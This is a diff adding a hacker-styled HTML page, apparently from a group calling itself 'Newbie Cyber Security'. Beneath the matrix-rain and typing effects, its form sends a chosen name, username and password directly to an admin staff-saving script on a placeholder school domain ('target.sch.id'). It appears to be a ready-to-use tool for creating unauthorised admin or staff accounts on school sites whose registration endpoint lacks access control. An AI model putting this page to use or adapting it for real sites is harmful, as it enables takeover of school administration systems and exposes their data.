@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SIK Registration - N.C.S</title>
+
+  <!-- Bootstrap 5 -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+  <!-- Custom Styles -->
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      color: #0f0;
+      font-family: 'Courier New', Courier, monospace;
+      overflow-x: hidden;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    .container-main {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 2rem 1rem;
+      text-align: center;
+    }
+
+    .form-box {
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 0 20px #00ff00;
+      width: 100%;
+      max-width: 400px;
+      animation: fadeIn 1.5s ease;
+    }
+
+    .form-control {
+      background-color: #111;
+      border: 1px solid #00ff00;
+      color: #0f0;
+    }
+
+    .form-control::placeholder {
+      color: #0f0;
+      opacity: 0.7;
+    }
+
+    .btn-custom {
+      background-color: #00ff00;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn-custom:hover {
+      background-color: #00cc00;
+    }
+
+    h1, h2 {
+      text-shadow: 0 0 10px #0f0;
+      animation: glitch 2s infinite;
+    }
+
+    hr {
+      border-color: #0f0;
+      width: 60%;
+      margin: 2rem auto;
+    }
+
+    @keyframes glitch {
+      0%, 100% { text-shadow: 2px 2px #0f0, -2px -2px #0f0; }
+      25% { text-shadow: -2px 2px #0f0, 2px -2px #0f0; }
+      50% { text-shadow: 2px -2px #0f0, -2px 2px #0f0; }
+      75% { text-shadow: -2px -2px #0f0, 2px 2px #0f0; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @media (max-width: 576px) {
+      h1 { font-size: 1.5rem; }
+      h2 { font-size: 1.2rem; }
+      .form-box { padding: 1.5rem; }
+    }
+  </style>
+</head>
+
+<body>
+  <canvas id="matrixCanvas"></canvas>
+
+  <div class="container-main">
+    <h1 id="typingText"></h1>
+
+    <div class="form-box mt-4">
+      <form action="https://target.sch.id/admin/simpanpetugas.php" method="POST">
+        <input type="text" name="nama" class="form-control mb-3" placeholder="Nama Lengkap" required />
+        <input type="text" name="username" class="form-control mb-3" placeholder="Username" required />
+        <input type="password" name="pass" class="form-control mb-3" placeholder="Password" required />
+        <button type="submit" class="btn btn-custom w-100">Simpan Data</button>
+      </form>
+    </div>
+
+    <hr />
+
+    <h2>NEWBIE CYBER SECURITY</h2>
+  </div>
+
+  <!-- Matrix Rain -->
+  <script>
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+
+    let width = window.innerWidth;
+    let height = window.innerHeight;
+    canvas.width = width;
+    canvas.height = height;
+
+    const fontSize = 14;
+    const columns = Math.floor(width / fontSize);
+    const drops = Array(columns).fill(1);
+    const letters = '01';
+
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, width, height);
+      ctx.fillStyle = '#0F0';
+      ctx.font = fontSize + 'px Courier New';
+
+      drops.forEach((y, index) => {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        const x = index * fontSize;
+        ctx.fillText(text, x, y * fontSize);
+
+        if (y * fontSize > height && Math.random() > 0.975) {
+          drops[index] = 0;
+        }
+        drops[index]++;
+      });
+    }
+
+    setInterval(drawMatrix, 50);
+
+    window.addEventListener('resize', () => {
+      width = window.innerWidth;
+      height = window.innerHeight;
+      canvas.width = width;
+      canvas.height = height;
+    });
+  </script>
+
+  <!-- Typing Effect -->
+  <script>
+    const text = 'REGISTRASI SIK BY N.C.S';
+    let index = 0;
+    const typingTarget = document.getElementById('typingText');
+
+    function typeEffect() {
+      if (index < text.length) {
+        typingTarget.innerHTML += text.charAt(index);
+        index++;
+        setTimeout(typeEffect, 100);
+      }
+    }
+
+    typeEffect();
+  </script>
+</body>
+</html>
